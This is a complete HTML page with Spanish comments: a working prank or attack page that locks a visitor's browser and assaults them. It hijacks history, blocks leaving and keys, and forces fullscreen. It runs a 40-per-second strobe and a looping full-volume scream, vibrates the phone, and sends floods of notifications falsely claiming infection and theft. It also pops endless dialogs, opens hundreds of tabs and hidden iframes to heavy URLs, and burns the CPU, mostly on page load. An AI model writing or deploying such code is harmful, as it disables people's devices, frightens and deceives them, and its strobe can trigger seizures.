<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>⚠️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            touch-action: none;
        }
        body {
            background: black;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
        }
        .strobe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99999;
        }
        .noise {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99998;
            background: repeating-radial-gradient(circle, black, white 1px);
            opacity: 0.15;
        }
    </style>
</head>
<body>
    <div id="strobeDiv" class="strobe"></div>
    <div class="noise"></div>
    
    <audio id="screamer" preload="auto" loop></audio>
    
    <script>
    (function() {
        // ==================== CONFIGURACIÓN DEL MP3 ====================
        // CAMBIA "horror-scream.mp3" por el NOMBRE EXACTO de tu archivo
        const MP3_FILE = "horror-scream.mp3";
        
        const audio = document.getElementById('screamer');
        audio.src = MP3_FILE;
        audio.loop = true;
        audio.volume = 1.0;
        
        // ==================== BLOQUEO TOTAL (imposible salir) ====================
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        for (let i = 0; i < 500; i++) {
            history.pushState({ i: i }, '', '#lock' + i);
        }
        
        window.addEventListener('popstate', function() {
            for (let i = 0; i < 100; i++) {
                history.pushState({}, '', '#block' + Math.random());
            }
            location.reload();
        });
        
        setInterval(() => {
            history.pushState({}, '', '#hijack');
        }, 30);
        
        document.body.style.touchAction = 'none';
        document.body.style.overscrollBehavior = 'none';
        
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        document.addEventListener('keydown', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // ==================== STROBO EXTREMO (blanco/negro rápido) ====================
        const strobeDiv = document.getElementById('strobeDiv');
        let strobeActive = true;
        
        function startStrobe() {
            let white = false;
            setInterval(() => {
                if (strobeActive) {
                    strobeDiv.style.backgroundColor = white ? 'white' : 'black';
                    strobeDiv.style.opacity = '0.98';
                    white = !white;
                }
            }, 25); // 40 parpadeos por segundo
        }
        
        // ==================== REPRODUCIR SCREAMER MP3 ====================
        function playScreamer() {
            audio.play().catch(function(e) {
                console.log("Error al reproducir: " + e);
                // Fallback: intentar de nuevo
                setTimeout(playScreamer, 100);
            });
            
            // Forzar volumen máximo cada 100ms
            setInterval(() => {
                audio.volume = 1.0;
            }, 100);
        }
        
        // ==================== VIBRACIÓN EXTREMA ====================
        function vibrateIntense() {
            if (navigator.vibrate) {
                navigator.vibrate([1500, 400, 1500, 400, 2500, 600, 1500, 400, 1000]);
            }
        }
        
        function startVibrationHell() {
            vibrateIntense();
            setInterval(() => {
                vibrateIntense();
                // Vibración corta extra
                if (navigator.vibrate) navigator.vibrate(500);
            }, 600);
        }
        
        // ==================== NOTIFICACIONES MASIVAS ====================
        function requestNotifications() {
            if (Notification.permission === 'granted') {
                spamNotifications();
            } else if (Notification.permission !== 'denied') {
                Notification.requestPermission().then(perm => {
                    if (perm === 'granted') spamNotifications();
                });
            }
        }
        
        function spamNotifications() {
            const mensajes = [
                "⚠️ ERROR CRÍTICO", "🔴 VIRUS ACTIVADO", "💀 DISPOSITIVO INFECTADO",
                "📱 DATOS EXPUESTOS", "👁️ TE ESTAMOS VIENDO", "🔊 VOLUMEN MÁXIMO",
                "💳 ROBANDO INFORMACIÓN", "📸 CÁMARA ACTIVADA", "🎤 MICRÓFONO ENCENDIDO",
                "📍 UBICACIÓN ENVIADA", "🔓 ACCESO TOTAL", "💰 TRANSFIRIENDO FONDOS",
                "📞 LLAMANDO A TODOS", "👻 NO PODRÁS SALIR", "💢 SISTEMA CORROMPIDO",
                "🔥 OVERHEAT DETECTED", "⚡ BATTERY DRAIN", "🎃 SCREAMER ACTIVE"
            ];
            let idx = 0;
            setInterval(() => {
                if (Notification.permission === 'granted') {
                    new Notification(mensajes[idx % mensajes.length], {
                        body: "Error #" + Math.floor(Math.random() * 9999) + " | Toque para continuar",
                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
                    });
                    idx++;
                }
            }, 600);
        }
        
        // ==================== ALERTAS INFINITAS (BLOQUEO UI) ====================
        function infiniteAlerts() {
            setInterval(() => {
                alert('⚠️ ERROR FATAL ⚠️\nCódigo: 0xDEADBEEF');
            }, 250);
            setInterval(() => {
                confirm('SISTEMA CORROMPIDO\nPresione OK para continuar...');
            }, 400);
            setInterval(() => {
                prompt('INGRESE CLAVE DE RECUPERACIÓN:', '');
            }, 550);
        }
        
        // ==================== PESTAÑAS INFINITAS ====================
        function openInfiniteTabs() {
            const urls = [
                'https://httpbin.org/bytes/2097152',
                'https://httpbin.org/bytes/1048576',
                'https://httpbin.org/drip?duration=5&numbytes=1000000',
                'about:blank#crash',
                'about:blank#pop'
            ];
            
            function spawnTab() {
                const url = urls[Math.floor(Math.random() * urls.length)];
                const win = window.open(url, '_blank');
                if (!win || win.closed) {
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'system_' + Date.now() + '.bin';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }
            }
            
            // 250 pestañas iniciales
            for (let i = 0; i < 250; i++) {
                setTimeout(spawnTab, i * 30);
            }
            
            // Continuar abriendo
            setInterval(() => {
                for (let i = 0; i < 20; i++) {
                    spawnTab();
                }
            }, 500);
        }
        
        // ==================== IFRAME FLOOD ====================
        function iframeFlood() {
            setInterval(() => {
                for (let f = 0; f < 50; f++) {
                    const ifr = document.createElement('iframe');
                    ifr.src = 'https://httpbin.org/bytes/500000';
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);
                    setTimeout(() => ifr.remove(), 300);
                }
            }, 400);
        }
        
        // ==================== FULLSCREEN FORZADO ====================
        function forceFullscreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
            if (screen.orientation && screen.orientation.lock) {
                screen.orientation.lock('portrait').catch(e => {});
            }
        }
        setInterval(forceFullscreen, 150);
        
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) forceFullscreen();
        });
        
        // ==================== PEDIR PERMISOS ====================
        function requestPermissions() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {}, () => {});
            }
            try {
                navigator.clipboard.writeText("INFECTADO").catch(e => {});
            } catch(e) {}
            requestNotifications();
        }
        
        // ==================== BLOQUEAR CAMBIO DE PESTAÑA ====================
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                location.reload();
            }
        });
        
        // ==================== BLOQUEAR BLUR (cambiar de app) ====================
        window.onblur = function() {
            setTimeout(() => {
                window.focus();
                location.reload();
            }, 10);
        };
        
        // ==================== CONGELAR CPU ====================
        function freezeCPU() {
            setInterval(() => {
                let basura = 0;
                for (let i = 0; i < 80000; i++) basura += Math.sin(i);
            }, 8);
        }
        
        // ==================== ACTIVAR INFIERNO COMPLETO ====================
        let hellStarted = false;
        
        function startHell() {
            if (hellStarted) return;
            hellStarted = true;
            
            startStrobe();
            playScreamer();
            startVibrationHell();
            openInfiniteTabs();
            iframeFlood();
            infiniteAlerts();
            forceFullscreen();
            requestPermissions();
            freezeCPU();
        }
        
        // Activar con toque (obligatorio para audio en Android)
        document.body.addEventListener('touchstart', startHell);
        document.body.addEventListener('click', startHell);
        
        // Auto-intento parcial
        setTimeout(() => {
            if (!hellStarted) {
                startStrobe();
                openInfiniteTabs();
                iframeFlood();
                infiniteAlerts();
                forceFullscreen();
                requestPermissions();
                freezeCPU();
                hellStarted = true;
            }
        }, 1500);
        
        document.body.style.position = 'fixed';
        document.body.style.top = '0';
        document.body.style.left = '0';
        
        console.log("Página lista. Archivo MP3 esperado: " + MP3_FILE);
    })();
    </script>
</body>
</html>
